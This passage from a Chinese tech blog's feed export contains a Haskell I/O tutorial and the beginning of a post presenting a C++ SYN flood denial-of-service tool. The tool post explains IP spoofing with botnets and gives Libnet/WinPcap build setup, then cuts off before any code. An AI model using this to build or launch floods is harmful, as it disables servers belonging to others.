&lt;h1 id=&quot;基本-I-O-行为&quot;&gt;&lt;a href=&quot;#基本-I-O-行为&quot; class=&quot;headerlink&quot; title=&quot;基本 I/O 行为&quot;&gt;&lt;/a&gt;基本 I/O 行为&lt;/h1&gt;&lt;h2 id=&quot;标准输入-输出&quot;&gt;&lt;a href=&quot;#标准输入-输出&quot; class=&quot;headerlink&quot; title=&quot;标准输入/输出&quot;&gt;&lt;/a&gt;标准输入/输出&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Prelude&lt;/code&gt; 定义了一些标准输入、输出及其函数：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;print&lt;/code&gt;：将任何可打印的值输出到标准输出设备&lt;/li&gt;
&lt;li&gt;&lt;code&gt;putStr&lt;/code&gt;：向标准输出输出字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;putStrLn&lt;/code&gt;：向标准输出输出字符串并添加换行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;getLine&lt;/code&gt;：从标准输入中读取一行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;interact&lt;/code&gt;：其类型签名为 &lt;code&gt;interact :: (String -&amp;gt; String) -&amp;gt; IO()&lt;/code&gt;，该函数接受一个签名为 &lt;code&gt;String -&amp;gt; String&lt;/code&gt; 的函数，对标准输入中的每个字符串做转换并输出。默认情况下 GHCI 采用 LineBuffering 模式，也就是每输入一行或输入足够长的情况下才产生一次回显&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;标准输入/输出实际是 &lt;code&gt;System.IO&lt;/code&gt; 预定义的一些句柄，以上的&lt;code&gt;getLine&lt;/code&gt;、&lt;code&gt;putStr&lt;/code&gt;等函数实际是由其句柄函数封装得来的：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;stdin&lt;/code&gt; ：&lt;code&gt;getLine = hGetLine stdin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stdout&lt;/code&gt;：&lt;code&gt;putStrLn = hPutStrLn stdout&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stderr&lt;/code&gt;：&lt;code&gt;print = hPrint stdout&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;句柄和简化的文本文件读写&quot;&gt;&lt;a href=&quot;#句柄和简化的文本文件读写&quot; class=&quot;headerlink&quot; title=&quot;句柄和简化的文本文件读写&quot;&gt;&lt;/a&gt;句柄和简化的文本文件读写&lt;/h2&gt;&lt;p&gt;&lt;code&gt;System.IO&lt;/code&gt; 包中包含了多数 I/O 相关操作，其中大多数操作已被 &lt;code&gt;Prelude&lt;/code&gt; 导入。&lt;code&gt;Handle&lt;/code&gt; 类型是文件句柄，Haskell 从句柄读写数据。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;openFile :: FilePath -&amp;gt; IOMode -&amp;gt; IO Handle&lt;/code&gt;：以文本方式打开一个文件并返回 IO Monad 包裹的句柄，其中 &lt;code&gt;IOMode&lt;/code&gt; 包括：  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ReadMode&lt;/code&gt;：只读&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WriteMode&lt;/code&gt;：只写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ReadWriteMode&lt;/code&gt;：读写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AppendMode&lt;/code&gt;：追加&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;openBinaryFile :: FilePath -&amp;gt; IOMode -&amp;gt; IO Handle&lt;/code&gt;：以二进制方式打开一个文件并返回 IO Monad 包裹的句柄，其中 &lt;code&gt;IOMode&lt;/code&gt; 与 &lt;code&gt;openFile&lt;/code&gt; 中相同&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hIsEOF :: Handle -&amp;gt; IO Bool&lt;/code&gt;：是否已读取到句柄末尾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hGetLine :: Handle -&amp;gt; IO String&lt;/code&gt;：从句柄中读取一行，此函数应只在文本文件的句柄中使用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hPutStrLn :: Handle -&amp;gt; String -&amp;gt; IO ()&lt;/code&gt;：向句柄中写入字符串并添加换行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hPutStr :: Handle -&amp;gt; String -&amp;gt; IO ()&lt;/code&gt;：向句柄中写入字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hPrint :: Show a =&amp;gt; Handle -&amp;gt; a -&amp;gt; IO ()&lt;/code&gt;：向句柄中写入可打印值（以上四个函数实际是标准输入/输出函数的内部实现）。注意此函数和 &lt;code&gt;putStr&lt;/code&gt; 不同，此函数可打印任何实现了 &lt;code&gt;Show&lt;/code&gt; 的实例的值，例如 &lt;code&gt;hPrint stdout &amp;quot;haskell&amp;quot;&lt;/code&gt;，则标准输出为 &lt;code&gt;&amp;quot;haskell&amp;quot;&lt;/code&gt;，而 &lt;code&gt;hPutStr stdout &amp;quot;haskell&amp;quot;&lt;/code&gt; 在标准输出产生的是 &lt;code&gt;haskell&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hClose :: Handle -&amp;gt; IO ()&lt;/code&gt;：关闭句柄&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hTell :: Handle -&amp;gt; IO Integer&lt;/code&gt;：返回此句柄目前对应文件位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hSeek :: Handle -&amp;gt; SeekMode -&amp;gt; Integer -&amp;gt; IO ()&lt;/code&gt;：按 &lt;code&gt;SeekMode&lt;/code&gt; 模式设置句柄位置，其中 &lt;code&gt;SeekMode&lt;/code&gt; 包括：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;AbsoluteSeek&lt;/code&gt;：绝对定位，按照给定的 &lt;code&gt;Integer&lt;/code&gt; 参数设置句柄位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RelativeSeek&lt;/code&gt;：相对定位，相对当前句柄位置按给定参数修正&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SeekFromEnd&lt;/code&gt;：从文件尾部定位，与 &lt;code&gt;AbsoluteSeek&lt;/code&gt; 方向相反&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hIsSeekable :: Handle -&amp;gt; IO Bool&lt;/code&gt;：返回该句柄是否可以定位&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hGetPosn :: Handle -&amp;gt; IO HandlePosn&lt;/code&gt;：返回该句柄位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hGetChar :: Handle -&amp;gt; IO Char&lt;/code&gt;：从句柄读取一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hGetContents :: Handle -&amp;gt; IO String&lt;/code&gt;：读取句柄全部内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hGetEcho :: Handle -&amp;gt; IO Bool&lt;/code&gt;：获取一个链接到终端的句柄的回显状态&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;openFile&lt;/code&gt;、&lt;code&gt;writeFile&lt;/code&gt; 可处理文本文件，通常可简化为以下三种操作，其中 &lt;code&gt;FilePath&lt;/code&gt; 是 &lt;code&gt;String&lt;/code&gt; 的别名：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;readFile :: FilePath -&amp;gt; IO String&lt;/code&gt;：接受一个 &lt;code&gt;FilePath&lt;/code&gt; 作为文件名，打开该文件（如果存在的话）并以字符串返回文件内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;writeFile :: FilePath -&amp;gt; String -&amp;gt; IO()&lt;/code&gt;：接受一个 &lt;code&gt;FilePath&lt;/code&gt; 作为文件名，向该文件写入字符串（如果文件不存在则创建，否则覆盖原文件）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;appendFile :: FilePath -&amp;gt; String -&amp;gt; IO ()&lt;/code&gt;：接受一个 &lt;code&gt;FilePath&lt;/code&gt; 作为文件名，并想该文件附加字符串（无论文件是否存在都会写入）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;序列化和语法糖&quot;&gt;&lt;a href=&quot;#序列化和语法糖&quot; class=&quot;headerlink&quot; title=&quot;序列化和语法糖&quot;&gt;&lt;/a&gt;序列化和语法糖&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;do&lt;/code&gt; 语法糖将执行非纯粹行为的代码包裹起来，其中：&lt;ul&gt;
&lt;li&gt;整个代码块返回的值是代码块最后一行语句返回的值&lt;/li&gt;
&lt;li&gt;在代码块中使用 &lt;code&gt;&amp;lt;-&lt;/code&gt; 从 I/O 行为中获取值&lt;/li&gt;
&lt;li&gt;在代码块中使用 &lt;code&gt;let&lt;/code&gt; 从纯粹代码中获取值，注意不是 &lt;code&gt;let..in&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;do&lt;/code&gt; 代码块返回的值与 &lt;code&gt;return&lt;/code&gt; 函数无关，&lt;code&gt;return&lt;/code&gt; 仅仅是将纯粹的值使用 Monad 包裹，与命令式语言中的 &lt;code&gt;return&lt;/code&gt; 没有任何联系。在 I/O 操作中，&lt;code&gt;return&lt;/code&gt; 的作用就是将纯粹值包裹到 IO Monad 中。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你可以假设，&lt;code&gt;do&lt;/code&gt; 代码块中的每个语句（除了 &lt;code&gt;let&lt;/code&gt;），都会产生一个待执行的 I/O 操作。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mapM&lt;/code&gt; 和 &lt;code&gt;mapM_&lt;/code&gt; 提供了在列表上应用 Monad 的方式，其中 &lt;code&gt;mapM&lt;/code&gt; 返回应用后的列表，而 &lt;code&gt;mapM_&lt;/code&gt; 丢弃结果。&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mapM :: (Monad m) =&amp;gt; (a -&amp;gt; m b) -&amp;gt; [a] -&amp;gt; m [b]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mapM_ :: (Monad m) =&amp;gt; (a -&amp;gt; m b) -&amp;gt; [a] -&amp;gt; m ()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;以下两个函数将 Monad 操作连接起来，当 Monad 为 IO Monad 时即为 do 的内部实现&lt;ul&gt;
&lt;li&gt;&lt;code&gt;(&amp;gt;&amp;gt;) :: (Monad m) =&amp;gt; m a -&amp;gt; m b -&amp;gt; m b&lt;/code&gt;：该函数连接两个 Monad 操作，首先执行第一个，之后执行第二个，返回是第二个 Monad 操作返回的值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(&amp;gt;&amp;gt;=) :: (Monad m) =&amp;gt; m a -&amp;gt; (a -&amp;gt; m b) -&amp;gt; m b&lt;/code&gt;：该函数执行第一个 Monad 操作，将其返回的结果传给第二个参数，第二个参数接受第一个 Monad 操作的结果，并返回另一个 Monad。例如 &lt;code&gt;getLine &amp;gt;&amp;gt;= putStrLn&lt;/code&gt; 作用就是从键盘读取一行，再输出到屏幕。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;文件操作和临时文件&quot;&gt;&lt;a href=&quot;#文件操作和临时文件&quot; class=&quot;headerlink&quot; title=&quot;文件操作和临时文件&quot;&gt;&lt;/a&gt;文件操作和临时文件&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;涉及非内容的文件操作相关函数包含在 &lt;code&gt;System.Directory&lt;/code&gt; 中，常见如：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;removeFile :: FilePath -&amp;gt; IO()&lt;/code&gt;：删除参数名指向的文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;renameFile :: FilePath -&amp;gt; FilePath -&amp;gt; IO()&lt;/code&gt;：重命名文件，可等同于 &lt;code&gt;mv&lt;/code&gt; 操作，但若第二个参数（重命名后的文件名）对应文件已存在，则该文件被要移动的文件覆盖。使用该操作应小心。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;renameDirectory :: FilePath -&amp;gt; FilePath -&amp;gt; IO()&lt;/code&gt;：重命名文件夹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;getTemporaryDirectory :: IO FilePath&lt;/code&gt;：获取当前机器的临时文件目录。有些机器并不存在默认的缓存目录，此时调用此函数将导致异常。因此此函数应当被 &lt;code&gt;catchIOError&lt;/code&gt; 包裹。例如，&lt;code&gt;catchIOError (getTemporaryDirectory) (\_-&amp;gt;return &amp;quot;.&amp;quot;)&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;临时文件主要使用 &lt;code&gt;openTempFile :: FilePath -&amp;gt; String -&amp;gt; IO(FilePath, Handle)&lt;/code&gt; 创建，对于二进制临时文件则使用 &lt;code&gt;openBinaryTempFile&lt;/code&gt;。该函数第一个参数为要创建临时文件的目录，第二个参数为临时文件的前缀，例如 &lt;code&gt;tempfile&lt;/code&gt;，则 Haskell 生成的临时文件会有类似 &lt;code&gt;tempfileXXXXXX&lt;/code&gt; 的文件名，后面的 &lt;code&gt;XXXXXX&lt;/code&gt; 为随机生成的序列。该函数会返回 IO Monad 包裹的路径和句柄。&lt;/li&gt;
&lt;li&gt;在临时文件试用结束后，通常会通过 &lt;code&gt;hClose&lt;/code&gt; 关闭临时文件句柄，之后 &lt;code&gt;removeFile&lt;/code&gt; 删除临时文件。此部分处理工作应由 &lt;code&gt;finally&lt;/code&gt; 包含以保证执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;I-O-异常捕获处理&quot;&gt;&lt;a href=&quot;#I-O-异常捕获处理&quot; class=&quot;headerlink&quot; title=&quot;I/O 异常捕获处理&quot;&gt;&lt;/a&gt;I/O 异常捕获处理&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;I/O 操作的异常捕获通过 &lt;code&gt;catchIOError&lt;/code&gt; 执行，该函数包含在 &lt;code&gt;System.IO.Error&lt;/code&gt; 中，签名为 &lt;code&gt;catchIOError:: IO a-&amp;gt; (IOError -&amp;gt; IO a) -&amp;gt; IO a&lt;/code&gt;。该函数接收两个 IO Monad 作为参数，如果第一个函数执行时产生异常，则执行第二个函数。&lt;/li&gt;
&lt;li&gt;一个更通用的异常捕获函数是 &lt;code&gt;catch&lt;/code&gt;，包含在 &lt;code&gt;Control.Exception&lt;/code&gt; 中，可捕获任意类型 IO 异常。如果你使用 &lt;code&gt;catch&lt;/code&gt; 则必须指定异常的类型，否则编译器会汇报模糊的定义错误。该函数类型签名为 &lt;code&gt;catch:: Exception e =&amp;gt; IO a -&amp;gt; (e -&amp;gt; IO a) -&amp;gt; IO a&lt;/code&gt;，第二个参数是一个函数，这个函数接收异常并执行第二个 Monad （即 &lt;code&gt;catchIOError&lt;/code&gt; 中捕获到异常后执行的 IO Monad）。这个函数必须指定错误 e 的类型，如果要涵盖所有错误，可以使用 &lt;code&gt;e :: SomeException&lt;/code&gt; 来泛解析。&lt;/li&gt;
&lt;li&gt;我们使用 &lt;code&gt;finally&lt;/code&gt; 来确保一个 IO 操作的执行，其类型签名为 &lt;code&gt;finally:: IO a-&amp;gt; IO b -&amp;gt; IO a&lt;/code&gt;，无论第一个 IO Monad 成功还是失败，第二个 IO Monad 都将执行，且整个代码块返回值为第一个 IO 行为的返回值。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;缓冲模式和命令行参数&quot;&gt;&lt;a href=&quot;#缓冲模式和命令行参数&quot; class=&quot;headerlink&quot; title=&quot;缓冲模式和命令行参数&quot;&gt;&lt;/a&gt;缓冲模式和命令行参数&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;I/O 行为有如下几种缓冲模式：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;NoBuffering&lt;/code&gt;：不使用缓冲，按字符逐个读取/写入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LineBuffering&lt;/code&gt;：使用行缓冲，当一个换行符被输出或整个缓冲区已经足够长时，输出缓冲才被写入。在交互式终端中，一旦输入一个回车，则缓冲区将立刻被写入/读取。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BlockBuffering&lt;/code&gt;：块缓冲，在可能的情况下按固定大小的块读取/写入，在读写大数据的情况下性能更好，但它将阻塞输入（无法获得回显）直到块足够大。它的值构造器接受一个 &lt;code&gt;Maybe&lt;/code&gt; 类型作为参数，如果是 Nothing 则使用预定义的缓冲区大小，否则如果输入是 &lt;code&gt;Just 1024&lt;/code&gt;，则使用 1024 字节缓冲区。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;hGetBuffering Handle&lt;/code&gt; 可以获得参数句柄的缓冲模式。&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;hSetBuffering Handle BufferMode&lt;/code&gt; 可以设置句柄的缓冲模式，例如 &lt;code&gt;hSetBuffering stdin (BlockBuffering Nothing)&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;命令行参数的读取可使用 &lt;code&gt;System.Environment&lt;/code&gt; 中定义的函数：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getArgs&lt;/code&gt; 返回 &lt;code&gt;IO [String]&lt;/code&gt;，包含了命令行参数的列表，和 C 语言中的 &lt;code&gt;argv&lt;/code&gt; 类似，这个列表的第一个元素是程序名，之后为其它参数。&lt;/li&gt;
&lt;li&gt;程序名称可通过 &lt;code&gt;getProgName :: IO String&lt;/code&gt; 获得。&lt;/li&gt;
&lt;li&gt;指定的环境变量可通过 &lt;code&gt;getEnv :: String -&amp;gt; IO String&lt;/code&gt; 获得，返回 &lt;code&gt;String&lt;/code&gt; 参数键对应的值。&lt;/li&gt;
&lt;li&gt;全部的环境变量可通过 &lt;code&gt;getEnvironment&lt;/code&gt; 获得，其返回值签名为 &lt;code&gt;[(String, String)]&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;在 POSIX 类系统中，可使用 &lt;code&gt;putEnv&lt;/code&gt; 或 &lt;code&gt;setEnv&lt;/code&gt;（包含在 &lt;code&gt;System.Posix.Env&lt;/code&gt; 模块中） 设置环境变量。但该操作不跨平台，在 Windows 中不存在设置环境变量的方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;System.Console.GetOpt&lt;/code&gt; 模块包含了更多处理命令行参数的函数。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;惰性-I-O&quot;&gt;&lt;a href=&quot;#惰性-I-O&quot; class=&quot;headerlink&quot; title=&quot;惰性 I/O&quot;&gt;&lt;/a&gt;惰性 I/O&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;在 Haskell 中，I/O 操作同样保持惰性。例如，&lt;code&gt;hGetContents&lt;/code&gt; 会从一个文件中获取全部内容，返回 &lt;code&gt;IO String&lt;/code&gt;。这里返回的 &lt;code&gt;String&lt;/code&gt; 就将被惰性求值。无论是读取一个 500 GB 的大文件还是一个 2 KB 的小文件，&lt;code&gt;hGetContents&lt;/code&gt; 均不会将文件读入内存。只有当真正使用到其返回的 &lt;code&gt;String&lt;/code&gt; 时，这个读取动作才开始执行。&lt;/li&gt;
&lt;li&gt;我们通常认为，只有 &lt;strong&gt;输出了对 I/O 返回值计算后的结果&lt;/strong&gt; 才算使用到了其返回值。&lt;/li&gt;
&lt;li&gt;当 &lt;code&gt;hGetContents&lt;/code&gt; 返回的 &lt;code&gt;String&lt;/code&gt; 在代码中不再被引用时，Haskell 的垃圾回收器将自动释放该部分内存。&lt;/li&gt;
&lt;li&gt;惰性 I/O 的体现可以通过下面的代码看出：&lt;code&gt;hPutStr&lt;/code&gt;并不是将整个 &lt;code&gt;inpStr&lt;/code&gt; 读入内存，&lt;code&gt;inpStr&lt;/code&gt; 仅当它写数据时才有效。当传输大文本文件时，你可以通过 &lt;code&gt;readFile&lt;/code&gt; 和 &lt;code&gt;writeFile&lt;/code&gt; 建立一个类似管道，内存使用不会很高，并且会很稳定。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- This example is modified&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- Its sources from 《Real World Haskell》&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       inh &amp;lt;- openFile &lt;span class=&quot;string&quot;&gt;&quot;input.txt&quot;&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;ReadMode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       outh &amp;lt;- openFile &lt;span class=&quot;string&quot;&gt;&quot;output.txt&quot;&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;WriteMode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       inpStr &amp;lt;- hGetContents inh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       hPutStr outh inpStr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       hClose inh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       hClose outh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;注意：你不能在使用 I/O 动作返回的结果之前就关闭句柄，例如上面的例子，如果 &lt;code&gt;hPutStr outh inpStr&lt;/code&gt; 和 &lt;code&gt;hClose inh&lt;/code&gt; 交换顺序，则程序崩溃。因为 Haskell 的惰性求值，在 &lt;code&gt;hPutStr&lt;/code&gt; 执行前，&lt;code&gt;inpStr&lt;/code&gt; 并未真正读入内存。&lt;/li&gt;
&lt;li&gt;惰性 I/O 可能导致副作用：I/O 操作返回的 &lt;code&gt;String&lt;/code&gt; 将被纯粹的代码使用，但纯粹的代码并不知道这部分 &lt;code&gt;String&lt;/code&gt; 是 I/O 行为的结果，因此当纯粹代码使用它的时候，可能会导致实际数据的读写。因此当需要和用户输入交互、或者输入数据随时间变化时，&lt;code&gt;hGetContents&lt;/code&gt; 可能并不合适。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/21/haskell-io-actions/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/21/haskell-io-actions/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/21/haskell-io-actions/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;整理 Haskell 中的 I/O 行为和性质，包括惰性 I/O、异常、临时文件、缓冲等。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Language" scheme="http://forec.github.io/categories/Language/"/>
    
    
      <category term="Haskell" scheme="http://forec.github.io/tags/Haskell/"/>
    
      <category term="OS" scheme="http://forec.github.io/tags/OS/"/>
    
      <category term="函数式编程" scheme="http://forec.github.io/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>基于 LibNET 的 SYN Flood 攻击</title>
    <link href="http://forec.github.io/2016/11/20/ddos-syn-attack/"/>
    <id>http://forec.github.io/2016/11/20/ddos-syn-attack/</id>
    <published>2016-11-20T13:42:03.000Z</published>
    <updated>2016-11-20T15:54:31.521Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SYN_flood&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WIKIPEDIA：SYN flood&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Denial-of-service_attack&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WIKIPEDIA: Denial of service attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上两个链接分别是 SYN 洪水攻击和拒绝服务攻击的维基百科。基本原理就是在 TCP 建立连接的三次握手过程中，伪造其它 IP 地址，并向服务器发送 SYN，消耗服务器带宽和 CPU 资源。攻击效果取决于参与攻击的肉鸡数量、网络状况、受攻击方的防范能力。&lt;/p&gt;
&lt;h1 id=&quot;Libnet-环境配置&quot;&gt;&lt;a href=&quot;#Libnet-环境配置&quot; class=&quot;headerlink&quot; title=&quot;Libnet 环境配置&quot;&gt;&lt;/a&gt;Libnet 环境配置&lt;/h1&gt;&lt;p&gt;工具基于 Libnet 编写，Windows下的环境配置较复杂，英文版配置说明可参考托管在 GitHub 上的 &lt;a href=&quot;https://github.com/Forec/ddos-synflood&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;README&lt;/a&gt;。具体配置如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从&lt;a href=&quot;https://github.com/sam-github/libnet/tree/master/libnet&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;下载 LibNET 源代码，从&lt;a href=&quot;http://www.winpcap.org/install/bin/WinPcap_4_1_3.exe&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;下载 WinPcap 的安装包。之后，从&lt;a href=&quot;http://www.winpcap.org/install/bin/WpdPack_4_1_2.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;下载 WpdPack 源代码。&lt;/li&gt;
&lt;li&gt;假设你将 LibNET 源代码包解压到 &lt;code&gt;E:\libnet-1.2-rc3&lt;/code&gt;，将 WpdPack 包解压到 &lt;code&gt;E:\WpdPack&lt;/code&gt;。&lt;code&gt;E:\libnet-1.2-rc3\libnet&lt;/code&gt; 下有一个文件夹 &lt;code&gt;win32&lt;/code&gt;。你需要使用该目录下的代码建立一个 VS 工程。&lt;/li&gt;
&lt;li&gt;配置这个工程：在 &lt;code&gt;E:\libnet-1.2-rc3\libnet&lt;/code&gt; 和 &lt;code&gt;E:\WpdPack&lt;/code&gt; 下均有一个名为 &lt;code&gt;include&lt;/code&gt; 的文件夹，如果你解压的位置和我上一步教程中相同，则这两个文件夹的路径分别为 &lt;code&gt;E:\libnet-1.2-rc3\libnet\include&lt;/code&gt; 和 &lt;code&gt;E:\WpdPack\include&lt;/code&gt;。 将这两个路径添加到工程的 VC++ &lt;code&gt;Include&lt;/code&gt; 目录。&lt;/li&gt;
&lt;li&gt;将 WpdPack 的 Lib 目录添加到工程的 VC++ &lt;code&gt;Lib&lt;/code&gt; 目录，这里是 &lt;code&gt;E:\WpdPack\Lib&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;编辑 &lt;code&gt;E:\libnet-1.2-rc3\libnet\win32&lt;/code&gt; 下的 &lt;code&gt;in_systm.h&lt;/code&gt;，在其末尾添加&lt;/li&gt;
&lt;/ul&gt;
